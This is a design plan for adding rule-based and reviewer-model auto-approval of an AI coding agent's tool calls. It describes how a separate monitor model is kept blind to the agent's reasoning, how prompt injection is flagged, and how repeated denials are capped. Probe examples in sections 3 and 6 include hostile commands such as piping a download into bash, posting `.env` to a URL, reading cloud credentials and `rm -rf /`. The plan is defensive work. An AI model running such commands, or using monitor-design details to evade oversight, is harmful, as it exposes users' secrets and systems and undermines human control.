# Plan: tool auto-approval and Auto mode (Track B)

Status: plan only, no code written. Written 2026-11-02 against `origin/main` eccd7c562. See [`ROADMAP.md`](./ROADMAP.md) for where this sits.

## 1. Problem

Every tool call that is not read-only asks for a click. The only control is a three-way switch per tool (off, ask, allow), and it cannot look at arguments. You cannot say "allow `npm test`, ask for `git push`, never read `.env`", and you cannot trust one MCP server while distrusting another. Nothing judges a call by its effect, such as touching production.

Goals:

- Cut routine approval clicks without a blanket "approve everything" switch.
- Rules you can write once, commit, and share, covering files, commands, web access and MCP tools.
- An optional "Auto" mode where a second, cheaper model reviews each call and either allows it, asks you, or refuses it with a stated reason.
- Every decision shows why it was made.

Non-goals: sandboxing or containers; scanning tool output for prompt injection on the server side (we can only add a client-side hint, see 7.4); changing what the tools themselves do.

## 2. Research

Read on 2026-11-02. I could not open Cline's source (the raw file URL returned 404), so Cline's behaviour below comes from its documentation only. The Claude Code engineering post and two of its documentation pages were returned truncated by the fetch tool, so the lists marked "partial" are what I could see, not the full set.

### 2.1 Cline (docs.cline.bot/features/auto-approve)

- Approval is checked per tool call against category toggles: read project files, read all files, edit project files, edit all files, run safe commands, run all commands, browser, MCP servers, notifications.
- The "all files" options only extend their base toggle. "Run all commands" extends "run safe commands".
- There is no fixed command allowlist. The model itself sets a `requires_approval` flag on each command it proposes, so the agent being supervised decides what is safe.
- YOLO mode approves everything, including file changes anywhere on the machine, terminal commands, browser, MCP tools and the switch from Plan to Act. The docs say it disables all safety checks.
- Notifications fire when approval is needed and when an auto-approved command has run for 30 seconds.
- Takeaway: simple, discoverable toggles are worth copying. Letting the supervised model grade its own commands is not.

### 2.2 Claude Code permissions (code.claude.com/docs/en/permissions, permission-modes)

- Modes: `default` (called Manual), `acceptEdits`, `plan`, `auto`, `dontAsk`, `bypassPermissions`.
- Rules are `allow`, `ask` and `deny`, written per tool, for example `Bash(npm run test *)`, `Read(./.env)`, `WebFetch(domain:example.com)`, `mcp__server__tool` and `mcp__server__*`.
- Deny rules apply in every mode, including bypass. Allow rules have no effect in bypass mode.
- Writes to protected paths are never auto-approved except in bypass mode.
- "Yes, and don't ask again" saves a rule to a per-repository local settings file. File-edit approvals last until the session ends instead of being saved.
- Reads inside the working directories need no approval. Shell commands need approval except for a built-in set of read-only commands.
- Takeaway: allow/ask/deny with argument patterns, deny always winning, and "always allow" writing a rule.

### 2.3 Claude Code Auto mode (anthropic.com/engineering/claude-code-auto-mode, code.claude.com/docs/en/auto-mode-config)

What the post says, as far as I could read it:

- Motivation: users accept 93% of manual prompts, which leads to approval fatigue. Cited incidents include deleting remote git branches from a misread instruction, uploading an auth token, and attempting migrations against a production database. The post attributes these to the model being over-eager, not malicious.
- A classifier (the post names Sonnet 4.6) reviews each action before it runs, in two stages: a fast single-token allow/block filter, then step-by-step reasoning only if the first stage flags the action.
- The classifier sees the user's messages and the agent's tool calls. It does not see the agent's own prose or tool outputs ("reasoning-blind"), so a hijacked agent cannot talk the reviewer into approving.
- A separate server-side probe scans tool outputs for prompt injection and adds a warning to the agent's context.
- When the classifier blocks, the denial goes back to the agent as a tool result with an instruction to find a safer route, not to work around the block. After 3 consecutive or 20 total denials the agent stops and a human is asked. Headless runs terminate instead.
- The post reports a false-positive rate of 0.4% for blocking safe actions. I did not see the other numbers (misses on real over-eager actions, synthetic exfiltration tests), so this plan does not cite them.
- Configuration: the classifier trusts the working directory and the repository's configured remotes at session start. Anything else is "external" until you list it under `autoMode.environment`. Explicit `deny` and `ask` rules run before the classifier. Denial notices name the matched rule, for example `[Data Exfiltration]`, and a "Recently blocked" list shows what was refused.
- Blocked by default (partial list, the page was cut off): download and run code (`curl | bash`), sending sensitive data to external endpoints, production deploys and migrations, mass deletion in cloud storage, granting IAM or repository permissions, changing shared infrastructure, irreversibly destroying files that existed before the session, force push, and commits that would send secrets outside the repository.
- If the classifier cannot produce a verdict, Claude Code denies the action.
- Takeaway: a separate reviewer that cannot see the agent's reasoning, an explicit trusted-environment description, named reasons, and a hard cap on repeated denials.

## 3. Current state (read from the code)

| Piece                       | Where                                                                                                | What it does today                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| --------------------------- | ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Per-tool policy             | `gui/src/redux/slices/uiSlice.ts` (`toolSettings`), `core/tools/definitions/*` (`defaultToolPolicy`) | Three states per tool name: `disabled`, `allowedWithPermission`, `allowedWithoutPermission`. Stored in the webview's persisted state (`store.ts` persists `ui.toolSettings`), not in config. Cannot depend on arguments.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| Defaults                    | `core/tools/definitions/*`                                                                           | Auto-allowed: read file, read file range, ls, glob, grep, search web, view diff. Ask: terminal command, create/edit files, fetch URL, codebase, repo map, subdirectory, open-file read. Off: create rule block, request rule.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Command check               | `packages/terminal-security/src/evaluateTerminalCommandSecurity.ts`                                  | Parses commands with shell-quote, splits on operators and newlines, and returns the strictest result per part. Can mark a command disabled (critical), ask (high risk or unknown), or allow (known safe). Hard-coded lists.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Policy evaluation           | `gui/src/redux/thunks/evaluateToolPolicies.ts`, message `tools/evaluatePolicy` in `core/core.ts`     | Core can make a policy stricter than the user's setting, never looser. A disabled result fails the call with a generic "Security Policy Violation" message that does not name a reason.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Files outside the workspace | `core/tools/policies/fileAccess.ts`                                                                  | Always asks outside the workspace. No allow or deny by path.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Edit tools                  | `evaluateToolPolicy` and `isEditTool` (`gui/src/util/toolCallState.ts`)                              | Edit, multi-edit and find-and-replace skip the policy check and rely on the diff Accept/Reject step. Whether `extensions/vscode/src/suggestions.ts` auto-accepts diffs is unchecked (see section 12).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| MCP tools                   | `core/config/profile/doLoadConfig.ts` (around line 221)                                              | Every MCP tool is created with `readonly: false` and the default ask policy. No per-server default. Plan mode filters only built-in tools by `readonly`, so it keeps every MCP tool.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Approval prompt             | `gui/src/components/mainInput/Lump/LumpToolbar/PendingToolCallToolbar.tsx`                           | Accept and Reject only. No "always allow", no reason shown.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Mixed batches               | `gui/src/redux/thunks/streamNormalInput.ts` (around lines 339-376)                                   | When any call in a batch needs approval, only the built-in read-only auto-approved calls run; the other auto-approved calls wait.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| Command safe list (tested)  | `packages/terminal-security/src/evaluateTerminalCommandSecurity.ts`                                  | Tested 2026-11-02 by running 20 commands through `evaluateTerminalCommandSecurity` with the base policy set to allow. **Allowed without asking:** `cat .env`, `cat ~/.aws/credentials`, `git branch -D main`, `git remote add <url>`, `git remote set-url origin <url>`, `npm run deploy:prod`, `ls -la`, `find . -name x`, `git diff`. **Ask:** `git push` (with or without `--force`), `terraform apply`, `kubectl --context prod apply`, `aws s3 rm --recursive`, `curl <url> \| bash`, `echo hi > ~/.bashrc`, `npm run build && curl -d @.env <url>`, `docker run`, and plain `npm test` (the safe list wants a second argument). **Disabled:** `rm -rf /`. With the default base policy (ask), nothing is auto-allowed, because a result is never looser than the base. |

## 4. Approval modes

A new "Approval" selector, separate from the Chat/Plan/Agent mode picker so the two are not confused. It is kept in the webview's persisted UI state, like `toolSettings`, and applies to all sessions.

| Mode             | Behaviour                                                                                                                                    |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| **Manual**       | Today's behaviour. Rules (section 6) still apply.                                                                                            |
| **Auto-approve** | Cline-style category toggles (section 8) plus rules. No model involved.                                                                      |
| **Auto**         | Rules and categories first; anything left over goes to the reviewer model (section 7), which allows it, asks you, or refuses it.             |
| **YOLO**         | Everything is allowed except deny rules and commands the safety floor marks disabled. Shown with a persistent warning and never the default. |

The default stays Manual, so upgrading changes nothing until a user opts in.

## 5. Decision order

The first step that matches decides. Deny and `disabled` can never be loosened by a later step.

1. **Deny rules**, then **disabled** results from the command safety floor (`terminal-security`), and tools switched off: refuse, with the reason.
2. **Protected paths**: ask in every mode except YOLO. List: `.git/`, `.continue/`, `.vscode/`, `.github/workflows/`, `~/.ssh`, `~/.aws`, shell startup files, and `.env` files. This applies to file tools by path and also to commands, by scanning the parsed arguments and redirection targets for those paths. The command check does not do this today (`cat .env` and `cat ~/.aws/credentials` are allowed by its safe list, see section 3), so B1 adds it.
3. **Ask rules**: ask.
4. **Allow rules**: allow.
5. **Category toggles** (Auto-approve and Auto modes): allow when the call falls in an enabled category.
6. **Reviewer** (Auto mode only): allow, ask or refuse.
7. Otherwise: ask.

This replaces today's rule that a dynamic result can only tighten the user's setting with an explicit order. Tools the user has switched off stay off, and the safety floor's `disabled` results stay refusals.

## 6. Rules in config.yaml

Rules live in config.yaml under `toolPermissions`, so they can be committed and shared. Today's per-tool toggle in the Tools tab stays as the baseline; where a rule and a toggle disagree, the rule wins, except that nothing can loosen a deny rule, a tool switched off, or a `disabled` result from the safety floor.

```yaml
toolPermissions:
  allow:
    - runTerminalCommand(npm run test*)
    - readFile(src/**)
    - mcp__datadog__*
  ask:
    - runTerminalCommand(git push*)
  deny:
    - readFile(**/.env)
    - runTerminalCommand(terraform apply*)
  auto: # used only in Auto mode, see section 7
    environment:
      trustedDomains: [github.com/b1tninja]
      productionMarkers: [prod, production]
    guidance:
      block: ["Never run database migrations"]
      allow: ["Running unit tests is fine"]
    limits: { consecutiveDenials: 3, totalDenials: 20 }
```

- The reviewer model is not named here. It is any entry under `models:` that has `roles: [reviewer]` (section 7.3).
- A rule is `toolName(pattern)` or a bare `toolName`. Terminal commands match on the command string, file tools on the path (globs, relative to the workspace), web fetches on `domain:`, and MCP tools on `mcp__server__tool` or `mcp__server__*`.
- For a chained command (`&&`, `;`, `|`, newlines), every part must match an allow rule for the whole command to be allowed, and any part matching deny refuses it. The split reuses the shell-quote handling in `terminal-security`. Command substitution (`$(...)`, backticks) and unparsable commands never match an allow rule.
- Allow patterns are matched against the whole parsed command, not a prefix of the raw string, so `npm test; rm -rf /` cannot ride on an `npm test*` rule.
- Schema lives in `packages/config-yaml/src/schemas/index.ts` (next to `modeModels`), with a matching merge rule in `packages/config-yaml/src/load/merge.ts`.

## 7. Auto mode: the reviewer

### 7.1 What it sees

- The user's messages in this conversation.
- The earlier tool calls (name and arguments only, not their outputs).
- The call under review.
- An environment summary: workspace folders, git remotes, `trustedDomains`, `productionMarkers`, the operating system, and the user's `guidance`.

It does not see the agent's own prose or any tool output. That keeps a hijacked agent from persuading the reviewer, and keeps the prompt small.

### 7.2 What it returns

Strict JSON: `{ "decision": "allow" | "ask" | "deny", "category": "<id from 7.5>", "reason": "<one sentence>" }`, temperature 0. Unparsable output is treated as "ask".

### 7.3 Which model (a user setting)

The reviewer is a model **role**, like Autocomplete or Edit. Add `reviewer` to `modelRolesSchema` (`packages/config-yaml/src/schemas/models.ts`, next to `subagent`) and give it a dropdown in the Models tab's "Additional model roles" card. A model opts in with `roles: [reviewer]`. Models with no `roles` list get the existing defaults (`chat`, `summarize`, `apply`, `edit`), so nothing becomes a reviewer by accident.

- **Unset means unavailable.** With no reviewer model, the Auto option in the Approval selector is disabled with the message "Choose a reviewer model in Settings > Models". No chat model is used as a silent fallback, because that would send the conversation to a provider the user did not pick for this.
- **Selection** follows the other roles: a per-profile pick stored in `selectedModelsByProfileId` (`core/config/selectedModels.ts`; `reviewer` needs adding to its role list).
- **Runs in core** through a new `tools/autoReview` message, so it uses the existing LLM clients and request options (proxy, CA bundle).
- **The wizard (Track A) offers it.** In the model checklist, a "Use as reviewer" toggle appears on each model, with a hint when the model looks small and fast.

Suggested defaults, to be confirmed by the PR B4 evaluation and not before. These are guidance for the GUI hint, not a built-in choice:

| Situation                                  | Suggest                                                                                                                          | Why                                                                                                                                             |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| Any hosted provider that is already set up | The same provider's small, fast model (for example a Haiku-class, mini-class or Flash-class model, whichever the provider lists) | No new account or key, similar latency profile, and the cost per decision is small. Anthropic used a mid-size model for its own, so test one.   |
| No data may leave the machine              | A local instruct model through Ollama or LM Studio                                                                               | The conversation never goes to a third party. Expect slower and less reliable reviews than a hosted model, so require the B4 results first.     |
| Same model as the agent                    | Allowed but flagged "not recommended"                                                                                            | A reviewer that is the same model as the one it supervises shares its blind spots and its context. A different model gives an independent view. |

The repository's existing model lists mention several small models, for example `claude-haiku-4-5`, `gpt-4.1-mini` and `gemini-3-flash-preview` (`core/config/onboarding.ts`, `packages/llm-info`). I have not measured any of them as reviewers.

### 7.4 Safety properties

- **Fails toward asking.** If the reviewer errors, times out or returns nothing usable, the call is shown to the user. Claude Code denies in this case; here a person is present in the IDE, so asking is the less disruptive safe choice. In a headless run (CLI) there is no one to ask, so the call is refused.
- **Deny and continue.** A refusal goes back to the agent as the tool result, with the category and reason, and an instruction to find a safer route rather than work around the block.
- **Hard caps.** After `consecutiveDenials` (default 3) or `totalDenials` (default 20) refusals in a session, the agent stops and the user is asked.
- **Floor stays.** Reviewer "allow" never overrides steps 1 to 4 of section 5.
- **Cheap path first.** Read-only built-in tools and calls decided by rules or categories never reach the reviewer. Identical calls in a session reuse the earlier decision.
- **Prompt-injection hint.** As a client-side stand-in for Anthropic's server-side probe, flag tool output that contains instruction-like text addressed to the agent and prepend a short reminder to anchor on the user's request. This is a hint, not a guarantee.
- **Privacy.** The conversation (user messages and tool calls) is sent to the reviewer model's provider. The settings page says so.

### 7.5 Why Auto can refuse or escalate

Each reason has an id, shown to the user and returned to the agent. The default outcome is a starting point; the evaluation in PR B4 may move a category between "deny" and "ask".

| Id                         | Default | Meaning                                                                                                                              |
| -------------------------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| `remote-code-execution`    | deny    | Downloads and runs code (`curl \| bash`, running a script fetched in the same command).                                              |
| `data-exfiltration`        | deny    | Sends files, environment variables, tokens or repository content to a destination not in `trustedDomains` or the repo's own remotes. |
| `credential-access`        | deny    | Reads or prints secrets (`.env`, key files, cloud credential files, secret managers) that the task did not require.                  |
| `production-impact`        | deny    | Deploys, migrations, or commands aimed at production: a `productionMarkers` match in a profile, context, host, URL or resource name. |
| `destructive-irreversible` | deny    | Deletes or overwrites files that existed before the session, or data stores, with no way back.                                       |
| `history-rewrite`          | deny    | Force push, deleting remote branches or tags, rewriting shared history.                                                              |
| `permission-change`        | deny    | IAM, repository or file-permission grants, `sudo`, user and group changes.                                                           |
| `shared-infrastructure`    | deny    | Changes to infrastructure other people use (clusters, queues, DNS, shared databases, CI settings).                                   |
| `security-weakening`       | deny    | Turns off TLS verification, authentication, logging or a safety check; adds a secret to code or CI configuration.                    |
| `beyond-request`           | ask     | Does more than the user asked for, or acts on something the user never mentioned.                                                    |
| `suspected-injection`      | ask     | The action appears to follow instructions found in a file, web page or tool output rather than from the user.                        |
| `outside-workspace`        | ask     | Writes outside the workspace, installs globally, or edits shell startup files and other user-wide configuration.                     |
| `cost-or-resources`        | ask     | Starts long-running, paid or resource-heavy work (large downloads, cloud resources, loops of API calls).                             |
| `uncertain`                | ask     | The reviewer cannot tell. Never silently allowed.                                                                                    |
| `reviewer-unavailable`     | ask     | The reviewer failed or timed out (see 7.4).                                                                                          |
| `denial-limit`             | ask     | The consecutive or total refusal cap was reached.                                                                                    |

Most of the deny reasons correspond to items in the blocked-by-default list I could read in Claude Code's documentation: remote code execution, exfiltration, production deploys and migrations, irreversible deletion, force push, permission grants, shared infrastructure, and committing secrets (which `security-weakening` covers). `credential-access`, `beyond-request`, `outside-workspace`, `cost-or-resources`, and the three system reasons at the end are additions for this extension, not taken from that source.

The user can adjust behaviour without editing prompts through `guidance.allow` and `guidance.block` in section 6, and a specific refusal can be turned into an allow rule from the "Recently blocked" list (section 9).

## 8. Category toggles (Auto-approve and Auto modes)

Modelled on Cline's list, with the "all files" options as extensions of a base toggle.

| Toggle                 | Allows                                                                                            |
| ---------------------- | ------------------------------------------------------------------------------------------------- |
| Read project files     | Read, list, search inside the workspace (already the default for built-in read tools).            |
| Read outside workspace | Requires the one above.                                                                           |
| Edit project files     | Edit tools inside the workspace.                                                                  |
| Edit outside workspace | Requires the one above.                                                                           |
| Run safe commands      | Commands the safety floor marks as safe.                                                          |
| Run all commands       | Requires the one above; commands the floor marks as "ask". Never `disabled` ones.                 |
| Web                    | Web search and URL fetch.                                                                         |
| MCP: per server        | One switch per connected server, and a "read-only tools only" option using the server's own hint. |
| Notifications          | A VS Code notification when approval is needed while the window is not focused.                   |

The difference from Cline is who decides "safe": the deterministic safety floor, not the model being supervised.

## 9. UI

- **Approval selector** next to the Chat/Plan/Agent picker, with a short description of each mode. YOLO shows a warning banner for as long as it is on.
- **Tools tab**: an "Auto-approve" card with the toggles from section 8 and a per-server list for MCP. Keep the existing per-tool switches.
- **MCP hints**: carry the server's read-only and destructive hints into `Tool` (they are discarded today at `doLoadConfig.ts`). They only pre-fill the per-server option and the reviewer's prompt. They are not trusted for approval, since a server describes itself.
- **Approval prompt**: add "Always allow `<pattern>`", which writes an allow rule to config.yaml (the global file in v1, as in Track A). Show why the prompt appeared, for example "Matches ask rule `git push*`" or "Auto: unsure".
- **Decision chip** on each tool call: "Allowed by rule", "Allowed by Auto", "Blocked by Auto [production-impact]".
- **Recently blocked** list with a button to turn a refusal into an allow rule or an environment entry.
- **Notifications** when approval is needed and the window is not focused.

## 10. Settings and defaults

Everything below is a user setting with the default shown. Defaults favour asking over allowing, and nothing changes for an existing user until they opt in.

| Setting                         | Default                                        | Reason                                                                                                                          |
| ------------------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| Approval mode                   | Manual                                         | Today's behaviour.                                                                                                              |
| Reviewer model                  | unset (Auto unavailable)                       | No silent choice of where the conversation is sent (7.3).                                                                       |
| Category toggles                | Read project files on; everything else off     | Matches Cline's own recommended starting point and what the built-in read tools already allow.                                  |
| Run safe commands               | off                                            | The safe list allows `cat .env` and `git remote set-url` today (section 3). It stays off until B1's protected-path check is in. |
| Reviewer timeout                | 15 seconds, then ask                           | A slow reviewer should not stall the agent; falling back to a prompt is safe. A guess, to be tuned in B4.                       |
| Refusal caps                    | 3 in a row, 20 in total                        | The figures Anthropic reports for its own auto mode. Not tuned for this extension.                                              |
| Protected paths                 | the list in section 5, always ask outside YOLO | Config, hooks, credentials and CI files are where a one-time edit has a lasting effect.                                         |
| YOLO                            | off, and the warning cannot be hidden          | Cline's own documentation calls it dangerous. Deny rules and the safety floor's `disabled` results still apply.                 |
| "Always allow" writes to        | the global `~/.continue/config.yaml`           | Same file Track A edits. A workspace file is a later option.                                                                    |
| Where Auto's decisions are kept | session only, never written to disk            | The reviewer prompt contains the conversation; keeping it would create a second copy.                                           |

## 11. PR breakdown

| PR  | Contents                                                                                                                                                                                                                                            | Tests                                                                                                                                                                                                  |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| B1  | `toolPermissions` schema and merge; rule engine in core; extend the `tools/evaluatePolicy` reply with `decision`, `source` and `reason`; named refusal messages replacing the generic one; protected paths for file tools and for command arguments | rule matching, chained and substituted commands, deny-wins ordering, path globs, MCP name patterns, and the command cases found in section 3 (`cat .env`, `git remote set-url`, `npm run deploy:prod`) |
| B2  | Approval selector (Manual, Auto-approve, YOLO); category toggles; MCP hints and per-server switches; "Always allow"; decision chips; notifications; fix for the mixed-batch wait                                                                    | gui tests for the selector and prompt; update the tool-call e2e selectors                                                                                                                              |
| B3  | The `reviewer` model role (schema, Models tab dropdown, selection storage); the reviewer: `tools/autoReview`, prompt, JSON parsing, caching, denial caps, deny-and-continue, injection hint. Behind an experimental setting                         | unit tests with a stub model for every outcome in 7.4; no live model in CI                                                                                                                             |
| B4  | Evaluation set and runner; confirm or change the suggested reviewer defaults and tune categories; docs in `docs/` and `docs/reference.mdx`; remove the experimental flag only if the quality bar below is met                                       | the evaluation itself; docs build                                                                                                                                                                      |

B1 comes first. B2 and B3 can proceed in parallel after it. B4 needs B3.

### Evaluation (B4)

About 200 labelled tool calls, each marked allow, ask or deny with an expected category. Sources: the existing cases in `packages/terminal-security/test/terminalCommandSecurity.test.ts`, new cases for each category in 7.5 (production profiles and hosts, exfiltration to unknown domains, history rewrites, secret handling), and a set of ordinary development commands that must be allowed.

Run each candidate reviewer model (a small hosted model and a local instruct model) and report, per category, how often a dangerous call was allowed and how often a safe call was blocked, plus median latency. The quality bar is set before running, not after: no dangerous call in the "deny" categories is allowed, and enough of the safe set is allowed that Auto is worth turning on. The numbers are recorded in the PR and in this file.

## 12. Risks

| Risk                                                                | Mitigation                                                                                                                                                                                           |
| ------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| The reviewer allows a dangerous call                                | Rules, protected paths and the safety floor sit before it and cannot be overridden; an evaluation gate before it is on by default; YOLO is a separate mode.                                          |
| Reviewer latency on every call                                      | Skip it for read-only tools and rule-decided calls; cache identical calls; use a small model; a timeout that falls back to asking.                                                                   |
| The conversation goes to a third-party model                        | The reviewer is a role the user assigns, so it can be a local model; there is no fallback to a chat model; the settings page says where the conversation goes; the reviewer never sees tool outputs. |
| An allow rule is bypassed by shell syntax                           | Match against parsed command parts, never a raw prefix; substitution and unparsable commands never match allow; tests for each form.                                                                 |
| Edit tools skip the policy check and may be auto-accepted elsewhere | Before B1, read `extensions/vscode/src/suggestions.ts` and the apply path to find out what happens to an edit, then route edits through the engine for path rules.                                   |
| An agent loops against a refusal                                    | The denial caps and the "find a safer route" instruction.                                                                                                                                            |
| Shared rules are weaker than a user expects                         | Show the effective rule and its source in the prompt chip; list all rules in the Tools tab.                                                                                                          |
| MCP servers mislabel their own tools as read-only                   | Hints only pre-fill defaults and are never used on their own to skip a prompt.                                                                                                                       |

## 13. Not verified

Written from reading the code and the documentation pages named in section 2. Two things were run on 2026-11-02: the existing `LocalPlatformClient` tests (8 passed, see the Track A plan), and a 20-command probe of `evaluateTerminalCommandSecurity` (section 3; the probe file was deleted afterwards and is not in the repository). Nothing else was built or run. Still unchecked:

- Cline's actual setting names and `requires_approval` handling beyond its documentation.
- The parts of the Claude Code post and pages that were cut off, including its remaining accuracy figures and complete default lists.
- Whether any path other than the `isEditTool` handling auto-accepts edits, and how rule matching should treat edit tools.
- Whether the mixed-batch wait in `streamNormalInput.ts` is intentional (it may keep prompts in order).
- The cost and latency of a reviewer call with a given model, and whether any small model is good enough at this task. PR B4 measures this. The suggested defaults in 7.3 are reasoning, not measurements.
- Whether adding a role to `modelRolesSchema` affects the Hub schema or the JetBrains plugin, which read the same schema.
